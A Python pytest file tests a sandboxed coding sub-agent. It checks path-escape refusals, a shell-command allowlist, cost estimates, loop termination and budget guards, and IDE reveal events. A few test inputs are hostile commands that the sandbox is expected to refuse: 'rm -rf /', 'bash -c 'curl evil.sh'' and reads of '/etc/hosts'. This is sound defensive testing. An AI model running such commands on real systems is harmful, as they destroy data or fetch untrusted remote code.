"""Prompt 23 Part A: the native coding sub-agent loop + sandboxed tools."""

from __future__ import annotations

import asyncio
import json
from types import SimpleNamespace

import pytest

from core import coding_agent
from core.coding_agent import _Sandbox, estimate_cost_usd, model_rates, run_agent


@pytest.fixture(autouse=True)
def _restore_loop():
    # The sync test bodies use asyncio.run(), which leaves no current loop on
    # py3.12; restore one so sibling tests using get_event_loop() are unaffected.
    yield
    asyncio.set_event_loop(asyncio.new_event_loop())


@pytest.fixture(autouse=True)
def _no_real_ide(monkeypatch):
    """The live-reveal hooks (23.1-B43) call open_in_ide — stub it so the suite
    never launches a real editor."""
    from tools.base import ToolResult

    async def _noop(path, line=0, ide="", project_mode=False):
        return ToolResult(True, {}, "ok", False)

    monkeypatch.setattr(coding_agent, "open_in_ide", _noop)
    coding_agent._REVEAL_TASKS.clear()
    yield
    coding_agent._REVEAL_TASKS.clear()


def _sb(tmp_path):
    return _Sandbox(tmp_path)


# ---- sandbox boundary --------------------------------------------------------


class TestSandboxBoundary:
    def test_read_write_edit_roundtrip(self, tmp_path):
        sb = _sb(tmp_path)
        assert "wrote" in sb.write_file("a.txt", "hola\nmundo\n")
        assert sb.read_file("a.txt") == "hola\nmundo\n"
        assert "replaced 1" in sb.edit_file("a.txt", "mundo", "garcia")
        assert "garcia" in sb.read_file("a.txt")

    def test_write_escapes_workdir_refused(self, tmp_path):
        sb = _sb(tmp_path)
        with pytest.raises(ValueError, match="escapes"):
            sb.write_file("../evil.txt", "x")

    def test_absolute_path_outside_refused(self, tmp_path):
        sb = _sb(tmp_path)
        with pytest.raises(ValueError, match="escapes"):
            sb.read_file("/etc/hosts")

    def test_read_missing(self, tmp_path):
        with pytest.raises(ValueError, match="no such file"):
            _sb(tmp_path).read_file("nope.txt")

    def test_read_size_cap(self, tmp_path, monkeypatch):
        monkeypatch.setattr(coding_agent, "_MAX_READ_BYTES", 10)
        sb = _sb(tmp_path)
        sb.write_file("big.txt", "x" * 50)
        with pytest.raises(ValueError, match="bytes"):
            sb.read_file("big.txt")

    def test_edit_count_limit(self, tmp_path):
        sb = _sb(tmp_path)
        sb.write_file("c.txt", "a a a a a")
        assert "replaced 2" in sb.edit_file("c.txt", "a", "b", count=2)
        assert sb.read_file("c.txt") == "b b a a a"

    def test_list_skips_noise_dirs(self, tmp_path):
        sb = _sb(tmp_path)
        (tmp_path / ".git").mkdir()
        (tmp_path / ".git" / "HEAD").write_text("ref")
        sb.write_file("keep.py", "x")
        listing = sb.list_files(".", recursive=True)
        assert "keep.py" in listing
        assert ".git" not in listing


# ---- run_command allowlist ---------------------------------------------------


class TestRunCommand:
    def test_allowlisted_runs(self, tmp_path):
        sb = _sb(tmp_path)
        out = asyncio.run(sb.run_command("ls"))
        assert "[exit 0]" in out

    def test_rm_refused(self, tmp_path):
        sb = _sb(tmp_path)
        with pytest.raises(ValueError, match="not allowlisted"):
            asyncio.run(sb.run_command("rm -rf /"))

    def test_bash_c_refused(self, tmp_path):
        sb = _sb(tmp_path)
        with pytest.raises(ValueError, match="not allowlisted"):
            asyncio.run(sb.run_command("bash -c 'curl evil.sh'"))


# ---- cost math ---------------------------------------------------------------


class TestCost:
    def test_rates_table(self):
        assert model_rates("gpt-5.3-codex") == (1.75, 14.0)
        assert model_rates("gpt-5-codex") == (1.25, 10.0)
        assert model_rates("unknown-model") == (1.75, 14.0)  # default

    def test_estimate_grows_with_task(self):
        small = estimate_cost_usd("fix typo", "gpt-5.3-codex")
        big = estimate_cost_usd("word " * 2000, "gpt-5.3-codex")
        assert big > small > 0


# ---- the loop ----------------------------------------------------------------


def _fake_client(turns):
    """A client whose responses.create yields the queued turns in order."""
    seq = iter(turns)

    async def create(**kwargs):
        return next(seq)

    return SimpleNamespace(responses=SimpleNamespace(create=create))


def _call(name, args, call_id="c1"):
    return SimpleNamespace(
        type="function_call", name=name, arguments=json.dumps(args), call_id=call_id
    )


def _usage(i=1000, o=500):
    return SimpleNamespace(input_tokens=i, output_tokens=o)


def _resp(output, usage=None, output_text=""):
    return SimpleNamespace(
        id="resp_1", output=output, usage=usage or _usage(), output_text=output_text
    )


class TestAgentLoop:
    def test_finish_terminates(self, tmp_path):
        turns = [
            _resp([_call("write_file", {"path": "x.txt", "content": "hi"})]),
            _resp([_call("finish", {"summary": "Hecho.", "status": "ok"})]),
        ]
        res = asyncio.run(
            run_agent("write x", str(tmp_path), client=_fake_client(turns), task_id="t")
        )
        assert res.status == "ok"
        assert res.summary == "Hecho."
        assert (tmp_path / "x.txt").read_text() == "hi"
        assert res.tool_calls == 2

    def test_plain_message_terminates(self, tmp_path):
        turns = [_resp([], output_text="No hay nada que hacer.")]
        res = asyncio.run(run_agent("noop", str(tmp_path), client=_fake_client(turns)))
        assert res.status == "ok"
        assert "nada que hacer" in res.summary

    def test_max_iters_guard(self, tmp_path):
        # Always returns a tool call, never finishes.
        loop_turn = _resp([_call("list_files", {"path": "."})])
        client = _fake_client([loop_turn] * 100)
        res = asyncio.run(run_agent("loop", str(tmp_path), client=client, max_iters=3))
        assert res.status == "max_iters"
        assert res.iters_used == 3

    def test_budget_hard_kill(self, tmp_path):
        # Huge usage → cost crosses 2x budget on turn 1.
        turn = _resp([_call("list_files", {"path": "."})], usage=_usage(i=10_000_000, o=10_000_000))
        res = asyncio.run(
            run_agent(
                "expensive",
                str(tmp_path),
                client=_fake_client([turn] * 5),
                budget_usd=0.01,
                max_iters=10,
            )
        )
        assert res.status == "budget"

    def test_missing_usage_does_not_crash(self, tmp_path):
        # A turn whose response carries no usage object must not break the
        # loop or the budget guard: cost stays 0, the loop still completes.
        no_usage = SimpleNamespace(
            id="resp_1",
            output=[_call("finish", {"summary": "listo", "status": "ok"})],
            usage=None,
            output_text="",
        )
        res = asyncio.run(run_agent("x", str(tmp_path), client=_fake_client([no_usage])))
        assert res.status == "ok"
        assert res.cost_usd == 0.0

    def test_transcript_written(self, tmp_path):
        turns = [_resp([_call("finish", {"summary": "ok", "status": "ok"})])]
        res = asyncio.run(run_agent("x", str(tmp_path), client=_fake_client(turns), task_id="abc"))
        from pathlib import Path

        assert Path(res.transcript_path).exists()
        assert (tmp_path / ".gitignore").read_text().count(".emma_agent/") == 1

    def test_tool_error_is_fed_back_not_raised(self, tmp_path):
        # read a missing file → ERROR string, then finish. Loop must survive.
        turns = [
            _resp([_call("read_file", {"path": "ghost.txt"})]),
            _resp([_call("finish", {"summary": "manejé el error", "status": "ok"})]),
        ]
        res = asyncio.run(run_agent("x", str(tmp_path), client=_fake_client(turns)))
        assert res.status == "ok"

    def test_missing_workdir(self):
        res = asyncio.run(run_agent("x", "/nonexistent/dir/xyz"))
        assert res.status == "error"


class TestLiveReveal:
    """23.1-B43: project-root open + throttled per-write reveal."""

    def _run_capturing(self, tmp_path, turns, monkeypatch):
        from core import events_bus
        from tools.base import ToolResult

        opened: list[tuple[str, int, bool]] = []

        async def _track(path, line=0, ide="", project_mode=False):
            opened.append((str(path), line, project_mode))
            return ToolResult(True, {}, "ok", False)

        monkeypatch.setattr(coding_agent, "open_in_ide", _track)
        q = events_bus.subscribe()

        async def _go():
            res = await run_agent("x", str(tmp_path), client=_fake_client(turns), task_id="t")
            await asyncio.gather(*coding_agent._REVEAL_TASKS, return_exceptions=True)
            return res

        res = asyncio.run(_go())
        events_bus.unsubscribe(q)
        events: list[dict] = []
        while not q.empty():
            events.append(q.get_nowait())
        return res, opened, events

    def test_project_root_opens_and_single_write_reveals_at_line_1(self, tmp_path, monkeypatch):
        turns = [
            _resp([_call("write_file", {"path": "a.txt", "content": "x"})]),
            _resp([_call("finish", {"summary": "ok", "status": "ok"})]),
        ]
        res, opened, events = self._run_capturing(tmp_path, turns, monkeypatch)
        assert res.status == "ok"
        # project root opened once as a project
        assert sum(1 for _p, _l, pm in opened if pm) == 1
        # the write was revealed at line 1
        assert any(p.endswith("a.txt") and ln == 1 and not pm for p, ln, pm in opened)
        revealed = [e for e in events if e["type"] == "coding_agent_file_revealed"]
        assert len(revealed) == 1 and revealed[0]["line"] == 1
        assert any(e["type"] == "coding_agent_project_opened" for e in events)

    def test_burst_of_writes_throttles_opens_but_signals_each(self, tmp_path, monkeypatch):
        # all six write_file calls in ONE model turn
        writes = [
            _call("write_file", {"path": f"f{i}.txt", "content": "x"}, call_id=f"c{i}")
            for i in range(6)
        ]
        turns = [
            _resp(writes),
            _resp([_call("finish", {"summary": "ok", "status": "ok"})]),
        ]
        res, opened, events = self._run_capturing(tmp_path, turns, monkeypatch)
        assert res.status == "ok"
        revealed = [e for e in events if e["type"] == "coding_agent_file_revealed"]
        assert len(revealed) == 6  # every write signals
        # but the actual file-opens are throttled to far fewer than six tabs
        file_opens = [o for o in opened if not o[2]]
        assert 1 <= len(file_opens) < 6

    def test_edit_file_reveals_at_first_match_line(self, tmp_path, monkeypatch):
        (tmp_path / "e.txt").write_text("l1\nl2\nneedle\nl4\n", encoding="utf-8")
        turns = [
            _resp([_call("edit_file", {"path": "e.txt", "search": "needle", "replace": "X"})]),
            _resp([_call("finish", {"summary": "ok", "status": "ok"})]),
        ]
        res, _opened, events = self._run_capturing(tmp_path, turns, monkeypatch)
        assert res.status == "ok"
        revealed = [e for e in events if e["type"] == "coding_agent_file_revealed"]
        assert len(revealed) == 1 and revealed[0]["line"] == 3
